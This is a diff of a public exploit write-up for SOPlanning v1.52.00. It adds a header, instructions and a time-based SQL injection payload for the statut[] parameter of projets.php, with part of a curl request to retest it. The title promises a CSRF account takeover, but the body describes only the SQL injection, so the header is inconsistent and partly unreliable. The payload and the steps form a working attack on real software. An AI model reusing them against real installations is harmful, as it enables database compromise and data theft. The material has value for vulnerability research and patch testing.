@@ -1,5 +1,33 @@
-Vulnerable request body parameters:
+Exploit Title: SOPlanning v1.52.00 'xajax_server.php' CSRF (Account Takeover)
 
+Application: SOPlanning
+
+Version: 1.52.00
+
+Date: 4/22/24
+
+Exploit Author: Joseph McPeters (Liquidsky aka fuzzlove)
+
+Vendor Homepage: https://www.soplanning.org/en/
+
+Software Link: https://sourceforge.net/projects/soplanning/
+
+Tested on: Linux
+
+CVE: Not yet assigned
+
+Description: SOPlanning v1.52.00 is vulnerable to Authenticated SQL Injection via the 'projects.php' page.
+
+Instructions: Authenticate to the host, the credentials can be obtained using a CSRF exploit (more info included). Once valid credentials are obtained use either a GET/POST request to send the valid parameters that equal to valid SQLi.
+
+Liquidsky @ Specialized Security Services Inc. (S3) | Shout out to the team!
+
+
+Vulnerable request parameters for request to "/www/projets.php":
+
+filtreGroupeProjet=1&statut[]=todo'+AND+(SELECT+8073+FROM+(SELECT(SLEEP(10)))PuxA)+AND+'Liquidsky'='Liquidsky&rechercheProjet=test
+
+The above parameters can be sent as either a valid GET/POST request to trigger the SQLi.
 
 Example Curl Request To Re-Test SQLi:
 
@@ -10,4 +38,4 @@ curl -i -s -k -X $'POST' \
     $'http://127.0.0.1/soplanning/www/projets.php'
 
 
-  Note: Cookies need to be authenticated and request needs to be valid for valid SQLi.
+  Note: Cookies need to be authenticated and request needs to be valid for valid SQLi. This curl request can be used with a proxy to reconstruct a valid request.
